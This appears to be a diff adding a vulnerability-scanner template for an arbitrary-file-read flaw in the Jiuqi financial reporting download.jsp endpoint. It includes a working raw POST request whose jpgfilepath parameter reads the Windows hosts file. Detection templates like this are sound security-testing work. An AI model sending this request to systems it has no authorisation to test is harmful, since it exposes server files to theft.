@@ -1,0 +1,26 @@
+id: jiuqi-download-lfi
+info:
+  name: jiuqi-download-lfi
+  author: apple
+  severity: medium
+  description: 久其财务报表 download.jsp 存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器上的信息
+  reference:
+    - https://github.com/Threekiii/Awesome-POC/blob/master/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E4%B9%85%E5%85%B6%E8%B4%A2%E5%8A%A1%E6%8A%A5%E8%A1%A8%20download.jsp%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /netrep/ebook/browse/download.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 30
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        Origin: http://114.251.113.53:7002
+        Content-Type: application/x-www-form-urlencoded
+
+        jpgfilepath=C:/Windows/System32/drivers/etc/hosts
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'Copyright'
